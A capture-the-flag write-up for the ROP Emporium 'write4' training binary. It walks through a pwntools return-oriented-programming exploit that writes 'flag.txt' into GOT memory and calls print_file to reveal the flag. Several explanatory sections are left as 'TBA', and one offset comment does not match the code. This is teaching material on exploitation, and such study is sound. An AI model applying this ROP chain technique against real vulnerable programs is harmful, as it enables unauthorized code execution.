# 4 write4

This challenge gives you an approach on read and write permissions in the running binary (writing data to GOT such as "flag.txt" in our case).
[challenge link](https://ropemporium.com/challenge/write4.html) using 64-bit binary.

## Understanding

TBA

## Objective

1. find pattern length (same as first [challenge](https://github.com/l0x539/CTFs-writeups/tree/master/ropemporium/ret2win)).
2. find the gadgets needed to write to an address memory.
3. find print\_file plt address (automated with pwtools).
4. chain the ropes.
5. exploit.

## Understanding the gadgets needed to write to an address and read from it

TBA

## Recon

Same as first [challenge](https://github.com/l0x539/CTFs-writeups/tree/master/ropemporium/ret2win).

Running `$ rabin2 -SS write4` gives the sections with read, write, execute permissions (we're only interested in r and w).

## Execution

TBA

## Writing exploit

in a file called [exploit.py](https://github.com/l0x539/CTFs-writeups/blob/master/ropemporium/write4/exploit.py)

with [pwntools](http://docs.pwntools.com/en/stable/) on python3.

* Imports:

```python3
from pwn import cyclic, process, ROP, ELF, p64
```

* Running and load binary file:

```python3
_FILE = "./write4"

p = process(_FILE)
binary = ELF(_FILE, checksec=False)
```

* Roping the binary:

```python3
rop = ROP(binary)
```

* Assigning gadgets that laods from the stack

```python3
pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]                      # or 0x00400692
```

* Load from the stack to a memory location:

This instruction copies content of r15 to an address pointed by r14.

```python3
pop_qword_r14 = 0x400628 # rop.find_gadget(["mov QWORD PTR [r14], r15", "ret"])[0]   # or 0x00400628 is open file argument
```

* The address to write to our string "flag.txt\0":

it's close to `pwnme@plt` but making sure it don't overwrite `print_file@plt`

```python3
pwnme_got =  binary.got['pwnme'] + 16 # 0x00600e00  # we gonna write "flag.txt" in this address +16 cause we don't wanna overwrite print_file got.plt address
```

* `print_file@plt` address to call:

```python3
print_file = binary.plt['print_file']
```

* The string to load in the stack and then to an address the to pass as an argument:

string should look like `string = "flag.txt" + "\x00"`, and that's what the next two python lines are doing.

```python3
flag_txt_str = b"flag.txt" # 8 characters
EOL = p64(0x0)             # adding null character at the end right after flag.txt so the file reader can open it.
```

the string should look like in the written address for the file to be opened:
```
<pwnme@got+16 addr>  flag.txt
<pwnme@got+24 addr>  NULL BYTE + WHATEVER WAS THERE
```

null byte at the end of string is important!

* Crafting the payload:

creating pattern of 40 characters `"A"*40`

```python3
# chaining
payload = cyclic(40, n=8)       # generating 40 characters pattern
```

* Loading Null Byte to the desired address that has write perms (in GOT table):

```python3
## add null character right after the string ==> string[1] = "\x00"*8
payload += p64(pop_r14_r15)
payload += p64(pwnme_got+1)
payload += EOL      # load this string to rdi (aka argument)
payload += p64(pop_qword_r14)
```

* Loading flag.txt same way:

```python3
## adding flag.txt ==> string[0] = "flag.txt";    notice that flag.txt is 8 character, if it was only 7 we could've got rid of the previous part doing string = "lag.txt\x00"
payload += p64(pop_r14_r15)
payload += p64(pwnme_got)
payload += flag_txt_str      # load this string to rdi (aka argument)
payload += p64(pop_qword_r14)
```

* Calling `print_file` with the argument:

that's similar to `print_file("flag.txt")`

```python3
## passing flag.txt\0 as an argument to print\_file
payload += p64(pop_rdi)
payload += p64(pwnme_got)
payload += p64(print_file)

```

* Sending payload and receiving output:


```python3
# interacting and sending payload
print(p.recvuntil("> ").decode("latin-1"))

p.sendline(payload)

# printing output
print(p.clean().decode("latin-1"))
```

Out put gives:

```
$ python3 exploit.py 
[+] Starting local process './write4': pid 27379
[*] Loaded 13 cached gadgets for './write4'
[*] pwnme: 0x601028
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> 
Thank you!
ROPE{a_placeholder_32byte_flag!}

```

And we got the flag!
